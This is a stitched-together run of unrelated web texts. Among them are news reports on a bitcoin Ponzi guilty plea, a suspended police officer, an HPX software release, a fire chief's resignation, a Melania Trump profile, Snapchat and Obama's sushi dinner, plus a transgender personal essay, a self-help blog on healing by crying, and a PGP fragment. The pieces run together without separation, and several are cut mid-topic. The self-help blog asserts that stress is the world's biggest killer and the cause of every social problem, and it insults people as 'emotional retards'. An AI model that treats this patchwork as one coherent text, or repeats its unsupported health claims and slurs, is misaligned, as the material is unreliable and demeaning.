Trendon Shavers, who authorities said defrauded investors after raising more than $4.5 million worth of bitcoins while operating Bitcoin Savings and Trust, pleaded guilty in Manhattan federal court to one count of securities fraud.
“I know what I did was wrong, and I'm very sorry,” Shavers said in court.
Under a plea deal, Shavers has agreed not to appeal any sentence at or below 41 months in prison. Sentencing before U.S. District Judge Lewis Kaplan is scheduled for Feb. 3.
Shavers, who went by “pirateat40” online, was arrested in November, two months after a federal judge in Texas ordered him to pay $40.7 million in a related U.S. Securities and Exchange Commission civil lawsuit.
Prosecutors said Shavers, who turned 33 on Monday, raised at least 764,000 bitcoins worth more than $4.5 million based on the average price of bitcoin during the period of the scheme from investors from September 2011 to September 2012. He promised interest rates of 7 percent per week or 3,641 percent a year.
The indictment said Shavers solicited the investments on the website Bitcoin Forum, offering to pay interest to investors who loaned bitcoins to Bitcoin Savings and Trust while he pursued a market arbitrage strategy.
Michael Ferrara, a prosecutor, in court on Monday said Shavers had invested some of the bitcoins with Mt. Gox, the now-defunct Tokoyo-based bitcoin exchange.
But Ferrara said Shavers, who lived in McKinney, Texas, largely instead used new investors' bitcoins to pay back prior investors.
“In other words, he had the telltale signs of a Ponzi scheme,” Ferrara said.
In court papers, prosecutors had also accused Shavers of misappropriating bitcoins to buy a used BMW M5 sedan and a $1,000 steakhouse dinner in Las Vegas, and to go to spas and casinos.
At the peak of the scheme, Shavers controlled about 7 percent of bitcoins in public circulation, prosecutors said. In total, prosecutors said he misappropriated 146,000 bitcoins and caused 48 investors to suffer losses.
The case is U.S. v. Shavers, U.S. District Court, Southern District of New York, No. 15-cr-00157.

A St. Louis County police officer, who was seen pushing a CNN anchor during protests in Ferguson, Mo., this week, was suspended from duty after a controversial video surfaced, in which he fashions himself as a merciless killer.
“I personally believe in Jesus Christ as my lord and savior, but I'm also a killer,” said officer Dan Page, a 35-year veteran, in the video. “I've killed a lot. And if I need to, I'll kill a whole bunch more. If you don't want to get killed, don't show up in front of me. I have no problems with it. God did not raise me to be a coward." Page added, “I'm into diversity — I kill everybody. I don't care."
St. Louis County Police Chief Jon Belmar said Page has been suspended, pending a review by the internal affairs unit, which will begin Monday. The video was brought to Belmar's attention by CNN's Don Lemon.
“With the comments on killing, that was obviously something that deeply disturbed me immediately,” Belmar told the St. Louis Post-Dispatch.
The comments, which were made before members of the Christian organization, the Oath Keepers, also included his story of going to Kenya in search of "undocumented president," Barack Obama. “I flew to Africa, right there, and I went to our undocumented president's home,” Page said, holding a picture of him in Kenya. “He was born in Kenya.”
Page has been ordered to take a psychiatric exam, according to Belmar, who issued a public apology for Page's remarks. “He does not represent the rank-and-file of [the] St. Louis County Police Department,” Belmar told CNN in a Friday on-air interview.

The STE||AR Group is proud to announce the release of HPX v0.9.11! In this release our team has focused on developing higher level C++ programming interfaces which simplify the use of HPX in applications and ensure their portability in terms of code and performance. We paid particular attention to align all of these changes with the existing C++ Standards or with the ongoing standardization work. Other major features include the introduction of executors and various policies which enable to customize the ‘where' and ‘when' of task and data placement.
This release consolidates many of the APIs exposed by HPX. We introduced a new uniform way of creating (remote) objects, we added distribution policies allowing to manage and customize data placement, we unified the way various types of parallelism are made available to the user. For a full list of changes (including possibly interface-breaking changes), please see the release notes.
This is the first official release which includes the necessary hooks and changes to integrate with the APEX library (a Autonomic Performance Environment for eXascale). This release also adds a number of new performance counters which expose intrinsic information about the file system, various internal invocation counts, etc. This simplifies gathering of performance-critical information at runtime.
We have continued our work since the last release to implement various C++ standardization proposal, for instance the so called ‘Parallelism TS' (document number N4505). Since then we have completed about 95% of the algorithms. In addition, we have extended the proposal to allow for the algorithms to be called asynchronously and when using customized executors.
We would like to thank everyone who has made this release possible. And what better way to thank them than by downloading HPX here! For more details about the recent changes, please check out our release notes. If you have any questions, comments, or exploits to report you can comment below, reach us on IRC (#stellar on Freenode), or email us at hpx-users@stellar.cct.lsu.edu.
For more details about these (and all other) changes please see the release notes.

Inter's striker Rodrigo Palacio is about to renovate his expiring contract with the team.
This week the Nerazzurri and the Argentinian player started to talk about a renewal of the contract and now there is optimism between the two parties that an extension can be signed soon.
According to TuttoMercatoWeb, Palacio would sign a one year contract with the chance of triggering an extension for a second year.
The player is keen on remaining in Italy rather than go back to Argentina, although Boca Juniors were apparently interested in bringing back their former player.
Rodrigo Palacio moved to Inter from Genoa in 2012 and has scored 54 goals in 131 appearances in all competitions with Inter.
This season he has made 12 appearances but has scored only a single goal against Cagliari in the Coppa Italia.
Black Saturday fire boss resigns
Updated
The head of Victoria's Country Fire Authority (CFA) Russell Rees has announced his resignation, after coming under mounting criticism for the CFA's handling of the Black Saturday bushfires that killed 173 people.
Mr Rees announced he was standing down at a press conference in Melbourne this morning, saying: "I am making the decision to go now so that the future of the CFA is assured."
"Now is the time to change. Now is the time for CFA to look forward."
Mr Rees rejected suggestions he was forced out because of his performance on Black Saturday.
"This decision is mine. I came to the conclusion at the end of the season, consulted with my family, consulted with the CEO, and now is the right time," he said.
Struggling to control his emotions at times, Mr Rees said it was important to stay on after Black Saturday to guide the organisation through a difficult time.
But he is leaving in July, 18 months before the end of his contract, and before the Royal Commission's final report.
"It would be inappropriate of me to stay on, and then leave halfway through what I see as being a major change period that will come out of the recommendations of the Commission," he said.
He declined to make any final assessment of his performance on Black Saturday, saying that was up to the commission to decide.
Mr Rees says his legacy will be the work he has done in implementing new management systems and safety systems for firefighters.
Reaction
Victorian Premier John Brumby says he understands and supports Mr Rees' decision to quit.
"It opens up new opportunities for the organisation and I think these are the things the very things that Russell would see going forward," he said.
"That new blood can come in, further changes can be made and the organisation can be furthered strengthened in the future."
Emergency Services Commissioner Bruce Esplin praised Mr Rees as a hardworking career fire officer who was a passionate and strong champion for the volunteers of the CFA.
He said he believes Mr Rees considered resigning after the bushfires but decided to stay.
"Perhaps it was harder to remain as chief and carry the organisation through the first year of the Royal Commission and the next summer. And I think he decided that was the hard and appropriate thing to do," he said.
He said Mr Rees is putting the CFA first.
"His advice to me was he wanted to put the organisation first and give it the chance to appoint a new chief fire officer to take it into the future."
Mr Esplin said Mr Rees should be credited with helping the CFA work more closely with the DSE.
But Mr Esplin does not necessarily support a union call for amalgamation.
"Amalgamation is not the only answer to achieving the change and improvements that are necessary. Sometimes you lose more than you gain."
Peter Marshall, from the United Firefighters' Union, has thanked Mr Rees for his service.
"Certainly like all firefighters, he's done the best he could [have] at the time. And no doubt we all have the benefit of hindsight," he said.
The president of the Volunteer Fire Brigades Association, Gary Lewis, has thrown its support behind Mr Rees.
He says Mr Rees' service can not be judged on the events of one day.
"There [are] a lot of things that Russell has done over the years since he's been chief officer [that] have [contributed to] outstanding growth for CFA," he said.
"Chief officer standing orders, management of the operations side of CFA has been really outstanding over the years."

Donald and Melania Trump pose ringside at the Mayweather vs Pacquiao fight at the MGM in Las Vegas on May 2 last year
Few who have been to the White House come away unimpressed with its imposing splendor and sumptuous glamour - a fitting home for a man who is master of all he surveys.
But for Melania Trump, one just hopes it won't be a terrible comedown.
As Americans try to come to terms with the astonishing prospect that Republican frontrunner Donald Trump really could become the next U.S. president, curiosity about the woman who might be America's First Lady is growing.
As these new pictures make dazzlingly clear, the former Slovenian supermodel is the couture-clad mistress of some of the most lavishly appointed homes in America.
Most of the photos were taken in the glittering bauble that tops the outspoken billionaire's property tree — a vast triplex apartment at the top of the 68-floor Trump Tower in Manhattan with fabulous views across Central Park.
Designed to evoke the Palace of Versailles (though even Louis XVI was never this garish), it boasts a cavernous hall of mirrors, acres of marble set off by ‘24-carat gold and diamond accents', and ceilings hand-painted with cherubs and scenes from Greek myths.
Trump also owns Seven Springs, a huge mansion outside New York in the upmarket hamlet of Bedford, which boasts 60 rooms, two servants' wings, 15 bedrooms, three swimming pools and 230 acres of land.
There's another mansion in rural Virginia, a huge house on Rodeo Drive in Beverly Hills and a vast waterside pile at Mar-a-Lago in Palm Beach, Florida.
Mrs Trump is certainly not embarrassed by the ostentatiousness, regularly posting pictures of her extravagant existence on social media.
At 45, 24 years younger than Trump, she has for years had to put up with people sniggering that all she sees in him is a great big dollar sign. Asked this week what it was that first attracted her to him, Mrs Trump avoided the obvious trap.
‘His mind, his amazing mind,' she said in her still thick Eastern European accent, narrowing her kohl-covered blue eyes for extra emphasis.
That mind may yet propel the Trumps to the White House, a remarkable achievement not just for him, but for a young woman who came to the U.S. 19 years ago from the communist privations of the former Yugoslavia.
The ambitious immigrant who became the third Mrs Trump may yet become the first foreign-born First Lady since Louisa Adams, the British-born wife of 1820s president John Quincy Adams.
First Ladies tend to fall into two categories: those content to look fragrant and fade gently into the background, and those — such as Nancy Reagan, Hillary Clinton and Eleanor Roosevelt — who make their presence felt not only in the White House but also in government.
Mrs Trump's virtual absence from the Trump nomination campaign, barely opening her mouth when she does appear, has left many convinced she would fall into the former First Lady category.
Scroll down for video
This week, she finally spoke out, perhaps keen to dispel widespread assumptions that Trump married her for her looks rather than her brains.
‘I'm not a “yes” person,' she told Us Weekly magazine in one of a clutch of interviews. ‘I give him my opinions.' Sometimes, he follows them, sometimes he doesn't, she says. ‘Do I agree with him all the time? No, I don't, and I tell him that.'
While he's on the campaign trail, they talk on the phone several times a day and Melania will opine on political developments.
Happily for marital harmony, she seems to agree with Trump on his most provocative views. She defended his controversial call to ban Muslims from entering the U.S., saying: ‘He wants to protect people of America. What's going on in the world, it's very dangerous.'
As a fellow immigrant, she was asked, wasn't she offended by Trump's vitriolic attacks on Mexican ‘illegals' (he suggested most were rapists and drug-dealers)?
No, she countered, she never dreamed of staying in the U.S. illegally. She says she renewed her work visa every few months until she could get permanent residency through a Green Card and eventually U.S. citizenship.
Mrs Trump insists she is not a nagging wife, which is just as well given Trump's many perceived failings.
Asked to reveal her secret to a happy marriage, she said simply: ‘Separate bathrooms.'
There will be plenty of those to spare in the White House and the increasingly confident-sounding Trump — who has commandingly won three of the first four state primaries — already talks of how his wife would be an ‘amazing representative for our country'.
Mrs Trump has shrugged off any First Lady talk, insisting her main priority is to be a mother to their nine-year-old son, Barron.

She doesn't even have a nanny, she says, though she does have her own chef.
U.S. pundits love to talk about the death of the American Dream as the economic expectations of ordinary people stagnate. But Mrs Trump has certainly managed it, coming a long way from modest roots in communist-era Yugoslavia.
The daughter of a car dealer, she grew up in Sevnica, a quiet industrial town, where the family was wealthy enough to go skiing in Austria.
Childhood friends remember Melanija Knavs, as she was then called, as a tall, skinny, well-mannered and shy girl who was a conscientious student.
She was 17 when a photographer spotted the 5ft 11in beauty and persuaded her to try modelling.
By 18, she had signed with a Milan modelling agency and was jetting between Paris and Italy on assignments, posing for photographers such as Helmut Newton and Mario Testino, while taking a design and architecture degree in what was now Slovenia.
Melania, who says she speaks five languages, changed her name to the more Germanic ‘Knauss' and moved to New York in 1996.
She met Trump two years later at a fashion industry party. She was 28, he was 52 and recently separated from his second wife, bit-part actress Marla Maples.

Trump's first wife, Ivana, is Czech-born: East European women clearly appeal to him.
Despite being on a date with another woman, he asked Melania for her phone number. She played a little hard to get, demanding his number instead and waiting three days before ringing him. They were soon an item.
Posing regally in what could be called the ‘Trump-L'Oeil' Versailles of their Manhattan palace, she looks and sounds the picture of respectability.
The Trumps married in Palm Beach in 2005, a $1 million affair in which Melania wore a $100,000 Dior dress and guests ate a 50lb Grand Marnier wedding cake.
Their son Barron was born a year later and she inherited four grown-up stepchildren.
She has launched a jewellery collection and skincare range that included a $150-an ounce, caviar-infused moisturiser she said she slathers on her son.
‘Melania is someone who can talk you down from a ledge, whatever crisis you may be in,' says Rachel Roy, a fashion designer chum.
New Delhi, Aug.28 (ANI): It is my first visit to Iran so naturally, I am excited about going to a country which has had historic ties with India, and is currently going through a politically tumultuous phase.
Being part of the Prime Minister's media delegation to Tehran to report on the 16th Non Aligned Summit, there won't be much time available to do sight seeing or visit any museums.
But packing for the three-day trip to an Islamic nation that restricts women's freedoms is a challenge.
The dress code is quite strict for women, so I have to pack with care. The contents have to be carefully selected and placed so that my bag is not opened at the customs counter and its contents displayed in front of everybody.
I also have to make sure that I have the 'right clothes' packed. Reporters, government officials and friends who have been to Iran are generous with tips. The head has to be covered at all times, so pack long dupattas and shawls. Full long-sleeved kameez that should cover the butt. An overcoat or manteau is advised. Loose salwars or pants, no churidaars. No sarees because those have a tendency to not stay in place. Anyway, who has long-sleeved-high-necked blouses other than Pratibha Patil?
Pack outfits with thick fabric that does not reveal any skin, and a big 'NO' to clingy material like crepe de chine or organza. Not even as a dupatta, that too better be wool or cotton.
I rummage through my cupboard to hunt for Indian outfits that would meet all these criteria. Just two, and those are the ones I bought in Pakistan. Nice long sleeves and high Chinese collars, copious amounts of fabric that swirl way below the knees. How I am going to be able to run around with camera equipment at the Summit wearing this ultra feminine attire is what I will have to work around. My cameraman of course has no such restriction.
Shoes, not sandals. Toes must be covered at all times. Check. By now, I am a little irritated. Not that I haven't travelled to places where one dresses to suit local sensibilities. It is just that I have never been somewhere where a dress code is enforced. For instance, I would dress differently while on a shoot in Srinagar than one in Goa. The same goes for whether I am in Lahore, or in Larnaca . I would do so not because of fear of a Sarpanch or a priest or a Mullah but because I would be drawing attention to myself rather than getting the shot and the sound bite that I want.
Many TV reporters make the mistake of becoming the news instead of reporting the news. Of course, sometimes even that is beyond your control, like in the case of British student journalist Natasha Smith, who was sexually assaulted by a mob in Tahrir Square.
There has been so much debate over the hijab, whether it is a social malady or it is a choice that women should be allowed to make. The fact is that women are still subjected to lashings for not wearing hijab.
In India too, there are places where women are forced by families to dress in a conservative manner: wear a dupatta, cover their heads, not wear jeans, wear bindi (pottu). To most modern women it is indeed frustrating that well into the 21st century, decisions on what is proper for women to wear still rests with men in many countries.
So as I pack, I realise that I am not making the decision on what goes into my suitcase. That decision has already been made by an unknown bearded cleric sitting in Tehran who is clueless about the NAM Summit and how his president is trying to shed his country's diplomatic isolation by hosting this meet.

Story highlights Competition from Facebook Poke may have spurred popularity of mobile app Snapchat
Snapchat lets users send images or videos that disappear after a few seconds
Popular with young users, Snapchat has a reputation as a "sexting" tool
Creators downplay its use to send nude pictures, say short-term sharing is fun
You may not have heard of Snapchat. But if there are teenagers or 20-somethings in your life, it's a safe bet that they have.
Snapchat is a mobile app which lets users share images or videos that disappear after a few seconds. That's right -- they vanish forever in the time it takes you to read a tweet.
In a little over a year since it was released by a Stanford student and his recently graduated business partner, Snapchat has has quietly amassed millions of users and now claims to process more than 30 million messages a day. Some bloggers have called it the "next Instagram."
Not bad for a mobile tool which, rightly or wrongly, is often cited for one very specific ability -- the "sexting" of naughty images to other users. In an age when young people are constantly being warned not to post inappropriate things online, Snapchat offers a degree of freedom by letting users share unfiltered thoughts or images without much fear of reprisal.
"Like most people born before the 1990s, I'm not a Snapchat user, and I've long assumed the worst about the app -- that combining cameras; young people; and secret, self-destructing messages could only mean trouble," wrote Slate's Farhad Manjoo last week.
But increasingly, he writes, it appears possible that "teenagers are more likely using the app to safely explore the sort of silly, unguarded, and sometimes unwise ideas that have always occupied the teenage brain ... in a manner that won't haunt them forever. In other words, they're chatting with Snapchat precisely because it's not like chatting with Facebook."
Not to be outdone, Facebook last month actually launched a virtually identical social app called Facebook Poke , a mobile re-imagining of one of the site's earliest, and ultimately most ridiculed, features. But instead of siphoning users from Snapchat, Facebook's move appears instead to have launched the upstart app to new heights.
Both apps let users send images or short videos and messages via their smartphones. The sender can choose how long the message will be visible -- up to 10 seconds -- before it self-destructs.

Facebook CEO Mark Zuckerberg reportedly was part of the team that coded the Poke app, currently available only on Apple's iOS system, in only a couple of weeks. A family photo posted by sister Randi Zuckerberg purportedly showed their family playing with the app over the holidays.
But if Facebook was looking to flex its billion-user muscle to take over the instant-chat market, it doesn't appear to be working.
On Thursday, Snapchat was the sixth-most popular free app for Apple's mobile devices. Facebook Poke wasn't in the top 100. As Forbes said in a recent headline, "the kids like SnapChat because it's NOT Facebook."
A newer version of Snapchat for Google's Android devices sat at a respectable No. 33 in the Google Play Store, ahead of stalwarts like Draw Something, Spotify, Fandango and Amazon Mobile. Facebook Poke isn't available for Android.
A look by analytics firm Topsy showed that mentions of Snapchat on Twitter spiraled to more than 212,000 on New Year's Day, up from about 16,000 on December 20, the day before Facebook introduced Poke. Facebook Poke got 1,822 mentions on January 1, according to Topsy.
So, does that mean young, socially savvy users are sending millions of racy pictures of themselves through cyberspace every day?
It's difficult to say. Technological advances and nudie shots have shared a strong, if secretive, relationship for centuries. From the printing press to pay-per-view to VCRs, new tech (particularly the kind that creates new levels of privacy) has always been followed closely by folks figuring out how to personally or professionally use it to get dirty.
There are clear, and sometimes ugly, signs that sexting is common on Snapchat.
"Snapchat Sluts," a Tumblr blog full of nude and semi-nude images, was started up last month by a "party photographer" who says he put out an open call for salacious shots on Twitter and was overwhelmed by the response. Another Snapchat-themed blog on Tumblr is filled with complaints about male users sharing photos of their genitalia.
Snapchat users may think their naughty images will never come back to haunt them. But people can still grab screenshots from their phones, even though both Snapchat and Facebook Poke notify the sender if the recipient of an image takes a shot of it.
And last week, Buzzfeed exposed an apparent security flaw that it says lets recipients retrieve videos sent via Snapchat.
All of which should be bad news when young people and questionable decisions collide with the dark alleys of the Internet, where even the most ill-gotten of sleaze is posted.
Snapchat did not respond to an interview request from CNN. But in one of only a handful of interviews he's given since launching, Snapchat co-founder Evan Spiegel told TechCrunch he thinks the sex talk about his app is overblown.
"I'm not convinced that the whole sexting thing is as big as the media makes it out to be," he told TechCrunch . "I just don't know people who do that. It doesn't seem that fun when you can have real sex."
But he also acknowledged to TechCrunch that the idea for the app, which he and Bobby Murphy hashed out after meeting at Stanford's Kappa Sigma fraternity house, was partly inspired by U.S. Rep. Anthony Weiner's unfortunate decision to share racy photos via Twitter.
So, if not for naughty bits, what exactly is the purpose of sending images and videos that rapidly disappear?
In a September blog post celebrating its first anniversary, Team Snapchat shared a vision that comes off as downright wholesome.
"We believe in sharing authentic moments with friends," it read. "It's not all about fancy vacations, sushi dinners, or beautiful sunsets. Sometimes it's an inside joke, a silly face, or greetings from a pet fish.
"There is value in the ephemeral," the post continues. "Great conversations are magical. That's because they are shared, enjoyed, but not saved."
Obama Gets A Taste Of Jiro's 'Dream' Sushi In Name Of Diplomacy

President Obama kicked off the first leg of his tour of Asia on Wednesday with some sushi diplomacy.
He dined with Japanese Prime Minister Shinzo Abe at a revered and tiny temple of sushi in Tokyo called Sukiyabashi Jiro. The subterranean restaurant, with just 10 seats at the counter, was made famous by the 2011 documentary Jiro Dreams of Sushi.
Obama emerged with a thumbs-up review. "That's some good sushi right there," he said. "It was terrific. Thank you so much."
If you've ever seen the documentary, you know why: The sushi Obama had been carefully crafted by 89-year-old sushi master Jiro Ono.

"His sushi is the best in the world," says David Gelb, who directed the film. "For someone who has a taste for true, pure Japanese sushi, I mean it's a place you kind of have to go to."
But for the many of us who haven't been lucky enough to grab one those 10 prized seats, Gelb joined All Things Considered's Melissa Block to talk about what it's like to dine at such an iconic place.
For starters, the restaurant is hidden in the basement of an office building and offers only one item on its menu — the omakase course, which can cost between $300 and $400 per person. It consists of 20 pieces of sushi, prepared and served one at a time.
"There are no appetizers, no rolls of any kind," Gelb says. "It's purely his style of sushi, which is kind of the classic Tokyo style, which is basically just fish and rice and seasoning, maybe a soy sauce or a nikiri, which is a kind of sweetened soy sauce."
And if you're fortunate enough to be one of Ono's costumers, don't even think about ordering off the menu — even if you are the president of the United States. "The Jiro that I know would not change his sushi for anyone," Gelb says, adding that "he just gives you what he feels is the best of the day."
And Ono really means the best. Every day, for instance, he massages the octopus he's planning to serve for an hour.
"The octopuses that he gets are trolling the seafloor, eating clams and other delicious shellfish," Gelb says. "And so he's getting the octopus that has the best diet, and then he massages it — or has his apprentices massage it, because he's getting on in the years — to bring out the best flavors."
That's because to Ono, making sushi is more than just a job; it's an art form, an obsession, even. In the film, he tells Gelb that he'd wake up in the middle of the night, and in dreams would have visions of sushi.
"His philosophy of work, where it's about finding a routine and mastering that craft, it applies to any kind of art," he adds.
So you can imagine, eating in front of such a meticulous artist can get a bit intimidating.
"The first time that I ate there, I was very nervous," Gelb tells Block. "I mean the man is a living legend, and he watches, and he observes the customers very closely, and so it can be a nerve-wracking experience."
But, he says, the sushi is so good that the tension melts away.
"The restaurant is very quiet," Gelb adds. "There's no music or anything. "There's just the sound of the fountain, and you kind of got into this sushi trance, and it's quite an amazing experience."
In its worst form, this kind of critique can be self-indulgent, overly academic, and boring. It's a micro-polemic: a big, philosophical attack on a topic that's fairly narrow and small. Wuthnow's critique, though, is ultimately concerned with how people derive knowledge about themselves, which is important. It speaks to the most basic project of public life: people collectively trying to figure themselves out, trading observations about the nature of existence as they all march steadily toward death.
Polls about religion impose neatness on this messy struggle with existence. They rely on tidy categories, marking points to help people see how others are like or unlike themselves. So if, as Wuthnow says, even the best polls are not that good, and they don't tell us much, it's worth considering: What fictions about belief get propagated when statistics are used for self-understanding?
* * *
For all its prominence today, modern American religion polling actually has a fairly short history. Wuthnow begins his narrative near the turn of the 20th century, when, “as near as anyone could tell,” he writes, “religion's influence was declining.” For decades, the U.S. Census Bureau had been tracking data about religious groups; major denominations also tracked their membership and participation. But as the surge of church planting on the American frontier drew to a close, immigrants flooded the country, and religious communities across the country saw declining attendance, clergy faced a new challenge: getting people back into church. To figure this out, sociologists started conducting neighborhood surveys, sending volunteers from house to house with questionnaires. These investigations were also sometimes part of larger attempts to understand urban communities. W.E.B. Du Bois, for example, included interviews with clergy in a massive 1899 study about communal life in Philadelphia.
Looking back at some of these early surveys, it's remarkable to see how all that's old becomes new again. In 1926, a Presbyterian preacher named Charles Stelzle convinced 200 daily newspapers to print a questionnaire about religion, God, morality, and prayer; roughly 125,000 readers responded. This method of data-gathering wouldn't pass muster under modern standards—the respondents were likely not representative of the American population, and it would have been impossible to know who the questionnaire missed. But the results still uncannily echo modern times: Nearly a century ago, 91 percent of these poll respondents said they believe in God, compared to the 92 percent who said the same in a Pew poll just a few years ago.
One of today's polling giants, Gallup, started asking survey questions about religion in 1939. (Again, slightly spooky results: In one poll, 37 percent of respondents said they “happened to go to church last Sunday,” which was the same percentage of self-reported weekly church attenders in a 2013 Pew poll. The methodological differences are crucial, but the irony is still crisp.) Gallup's engagement with religion polling was critical to its spread, Wuthnow argues, and the organization introduced a novel way of talking about faith. “Polls regularly asked people their opinion of religion,” Wuthnow writes. “They were asked if religion as a whole was increasing or losing its influence on American life. The question assumed they would somehow know, and that the results would somehow be meaningful.”
It's pretty clear to me now that my entire life has been leading up to this juncture when I can finally say, “I accept myself for who I am and what I've been through and that's okay!” All of the pain, the hurt, and the suffering that I have endured within my lifetime were for a better, more positive purpose. From time to time I become overwhelmed with, what I call, “the sadness”. It's that infinitely desolate landscape in our minds where we feel isolated and just beyond any shadow of hope. This is where people lose their souls to depression, addiction, or much worse….suicide. I have made a conscious decision to use the totality of my experience in order to help, encourage, and inspire others. Embracing myself for exactly who I am has been one of the hardest things I've ever had to do in my life.
My major insecurity has been the fact that I am Transgender. More specifically, I am a 32 year old post-operative Transsexual woman. Until recently, simply saying the word “transsexual” or hearing the word “tranny” made me extremely uncomfortable mainly due to my own internalized Transphobia. As a Trans woman I've carried around a lot of feelings of guilt, shame, and embarrassment due to my first-hand experiences of discrimination, ridicule, and accusations of being deceitful or questioning the authenticity of my womanhood. I am not my gender, nor am I my surgeries. I'm an artist, a musician, a seeker, a wife, a friend, a sister, granddaughter, a free thinker, a believer and much, much more.
I've known from a very young age exactly who I was and that my mind, body, and spirit were in discord with one another, yet I also knew that I didn't want to be this way. I never chose to be like this. For the first 19 years of my life I suppressed who I really was and because of it I've suffered severely. Coming out to my family and friends was utterly liberating because I no longer had to hide who I was. Instead, I thought that I could now transition to the person I've always known myself to be, live my life as a “normal” cisgender female and everything would fine, but it wasn't fine. I just went from hiding who I was on the inside to hiding who I used to be. It was always still me just in a different form. Constantly carrying around this secret and paralyzed with fear of who may or may not know was too much for one person to bear. I'm finally releasing this crazed monkey off my back, as it were, and saying I'm proud of who I am! I've overcome a lot of obstacles and I am a better person for it. I truly believe that the Universe, God, or whatever you want to call it wants to express and manifest itself through the natural world. The most natural state of being is that which is unobstructed from love. As long as we are true to ourselves and love the true essence of who we are there's no greater link to the Divine.
The ability to manage your emotions is absolutely crucial in the game of life. Many of us spend so much time living in a state of disease, that it practically becomes our typical way of being. And can you blame us? With so many problems in modern society, even just the stress of managing your finances alone can be enough to make you fall into a depression if you don't know how to properly manage your emotions.
This is also one of the topics of occulted information that is not consciously taught in schools or by our parents, probably because they never really learned it themselves–they just figured it out as they went along in life (or probably never figured it out at all).
So let me just stop here for a minute to say something. Knowing how to do this is really damn important. This information could literally change your life, so please pay attention.
It's nothing you don't already know, per se, but when you become fully conscious of how emotional processing actually works, you will be able to use this method like running anti-virus software on your computer, and once you become practiced at it, you won't even have to consciously think about doing it any more, it will just become second nature–like knowing how to go to the bathroom–only in this case, dumping your emotional garbage.
So here is how it works. Let's say someone close to you recently passed away, and you're having trouble dealing with it. Every time you think about that person, you fall into a depression, an abysmal feeling of hopelessness knowing that you will never be able to see that person again during this lifetime.
This feeling of despair is so overwhelming that it paralyzes you. You can't go out, you can't get out of bed, can't exercise, whatever. It's just too hard to deal with the pain.
This feeling could also come from other situations like going through a break-up with a romantic partner or having something humiliating happen to you in public. Whatever the case, the basic process for dealing with it is the same.
Step 1: Identify that You are Emotionally Disturbed
Before any healing can be done, you must first realize that you are not feeling well. This may seem obvious, but for someone who is commonly emotionally disturbed, it may not even be noticeable because you've become so numb that you've gotten used to it.
You will only have effectively identified this problem once you have officially become self-aware of it. Usually people just allow their emotions to run them blindly without any level of mindfulness, and that is simply not an effective, efficient, and responsible way to handle yourself. It's literally what children do when they have temper tantrums–they scream and cry until they get tired out and pass out.
Well, guess what? There are plenty of adults who still do the same thing. Maybe they don't scream and cry like a little kid, but they complain and nag and take it out on other people, or just let it stay pent up inside of them, which is actually much worse.
The method I'll be teaching you is basically how to have a controlled temper tantrum–a way to release your pain in a mature and efficient manner.
Step 2: Confront Your Situation
Once you've become self-aware of your emotions and feelings, you are now in a position to confront your problem. This step is typically where most people falter, because they are too afraid to face their problems head-on. This is also where most people resort to their destructive habits for pain relief, such as drinking, smoking, binge eating, playing violent video games, masturbating, etc.
Do these “band-aids” actually help? Sure, they provide temporary relief, but what happens later on? If these problems aren't sufficiently taken care of through the process of healing, they can literally stay inside of people for the rest of their lives.
And people say cigarettes, car accidents, and cancer are the top killers in the world.
Well, guess what? That's not even remotely true. Stress is the biggest killer there ever was and ever will be. It's the cause of every problem known in modern society.
Have you noticed that cultures with low-stress lifestyles have little to no suicides and longer lifespans? Gee, I wonder why!
So this is the moment of truth. You are aware that you have a problem, and either you can handle it like a child by ignoring it or taking it out on someone else, or you can handle it like an adult and make the choice to properly heal it.
The fact that most people are not able to choose the path of healing is the primary reason why planet Earth is still in a developmental retard. We have 20, 30, and 40-year-old so-called adults still taking out their anger and frustration from childhood on innocent people. Do not be one of these emotional retards! You are better than that.
Step 3: Create a Space of Healing
Okay, so at this point you've recognized that you have a problem by becoming self-aware of it, and you've made the courageous decision to confront it and heal it. Congratulations, you're now officially more emotionally mature than most other people on the planet!
So to create a space of healing, here is what I recommend:
1. Retreat to a place of sanctuary. Turn off the TV, get away from noisy people, and go somewhere that you feel safe and private. If you had to, you could even do this in a public bathroom or in your car, anywhere that you can feel secure and private.
2. Connect with nature. Light a candle, take a bath, go out for a walk in the woods, or do another task that helps you get centered and connected with nature. Natural elements like water and fire help to relax us and get us out of our heads. If you're not at home and don't have access to these things, you could just go outside or open a window to feel the wind.
3. Raise your vibration. Play music or use your own rhythmic breathing to raise your vibration and connect with your spirit. I personally listen to music a lot, so I'm very connected with particular songs that trigger my emotions. I've built a playlist for myself that I use whenever I need to do some intensive healing–most of the songs being from certain periods of my life that contain nostalgic value. Music isn't necessary for everyone, but I find it very helpful, so I recommend it.
Step 4: Initiate the Process of Healing
So now you've created a peaceful environment for yourself. Maybe you're lying in the bath tub with some candles lit and soft music playing. Maybe you're sitting on the dock at a lake, a rock out in the woods, or on your bed.
Focus on the source of the pain until you are able to elicit an emotional response from yourself. If you're grieving a deceased loved one, use a photo of them to help you connect with the memory of them until you completely break down.
If you're doing this right, you should end up crying like a blubbering baby. Do this for as long as you need until you literally cannot cry another tear. Get it all out, all of it! Every last drop until you are hollow inside and have hit rock bottom (thank you, Fight Club).
It's in this space of being that transformation (personal alchemy) occurs. It's the process of shifting from one level of consciousness to another, and it is necessary in order to evolve on a spiritual level.
So now you may be thinking, “Damn it, Skyler! I'm a grown man or woman, and I haven't cried since I was a kid. Crying's for babies, and I'm an adult!”
Well, let me put it this way. Crying is the most effective method for healing because it covers all of your bodies (mental, spiritual, physical, emotional) at the same time. In fact, I'll even venture to say that this is precisely what the function of crying actually is–a built-in method to facilitate the process of healing for the biological vessel, not just a way to express an emotional outburst, like we've always thought.
So this changes the perception of crying now, doesn't it? Why do you think it's so prominent in movies and professional actors are paid millions of dollars to do it on command with complete authenticity?
Because that's where the magic of transformation lies. That's how characters in stories progress–they go through the motions of their story arc, and once they hit rock bottom, there's an emotional catharsis, and afterward they come out a changed person.
Conclusion
So this is the method for healing that I personally use and recommend to others. Of course, there are other ways of doing it, but I think this is the most efficient and effective method (at least that I know of).
If you can't cry, then you still have a lot of personal work to do. I know this is difficult for most men who have been told their entire lives to suck it up, but if you want to be an emotionally healthy and mature individual, then you need to be able to heal yourself, and crying is the key to the process.
This will not only make life easier for you, but it's the secret to living longer. If you can effectively combat stress, then you are preventing disease. Simple as that!
This is a huge success because similar figures have never been reached with PGP - even though the protocol was introduced over 20 years ago. The reason is simple: PGP is rather complicated - cryptography experts like Matthew Green even argue that "It's time for PGP to die".
One of the major problems why PGP has not become mainstream is that the other person needs to use it as well. This is rarely the case. So even if one person makes the move and wants to use PGP, they soon get frustrated because none of their friends wants to make the move as well.
